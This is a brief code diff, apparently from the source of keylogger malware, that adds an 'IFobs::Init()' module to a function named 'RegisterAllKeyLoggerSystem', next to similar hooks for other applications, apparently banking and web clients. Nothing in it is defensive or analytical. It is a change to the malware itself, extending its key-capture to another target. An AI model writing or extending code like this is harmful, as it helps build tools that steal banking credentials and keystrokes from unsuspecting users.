@@ -207,6 +207,10 @@ void RegisterAllKeyLoggerSystem(PKeyLoggerFilterData Data, DWORD hashApp)
 		AvangardWeb::Init();
 	#endif
 
+	#ifdef IFobsH
+		IFobs::Init();
+	#endif
+
 	#ifdef YandexH
 		YandexSearchJpg::Init();
 	#endif
